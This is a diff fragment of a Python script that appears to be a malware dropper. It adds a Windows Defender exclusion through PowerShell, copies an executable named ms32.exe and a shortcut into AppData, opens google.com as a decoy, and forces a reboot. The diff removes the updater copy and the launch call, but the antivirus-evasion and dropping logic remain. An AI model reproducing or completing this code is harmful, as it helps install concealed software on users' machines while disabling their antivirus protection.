@@ -48,25 +48,14 @@ def run_powershell_command(command):
 command = f"Add-MpPreference -ExclusionPath '{path}'"
 run_powershell_command(command)
 try:
-    # Ensure the destination directory for the folder exists
-    if not os.path.exists(appdata_path):
-        os.makedirs(appdata_path)  # Create the directory if it doesn't exist
-
-    if not os.path.exists(destination_folder):
-        os.makedirs(destination_folder)  # Create the 'effects' directory
-
     # Copy the ms32.exe file
     shutil.copy(source_path_exe, destination_path_exe)
     print(f"File copied from {source_path_exe} to {destination_path_exe}")
 
-    # Copy the updater.exe file
-    shutil.copy(source_updater, destination_updater)
-    print(f"File copied from {source_updater} to {destination_updater}")
-
     # Copy the shortcut file
     shutil.copy(source_shortcut, destination_shortcut)
     print(f"File copied from {source_shortcut} to {destination_shortcut}")
-    os.startfile(destination_path_exe)
+    
     open_t("https://google.com")
     sleep(3)
     os.system("shutdown /r")
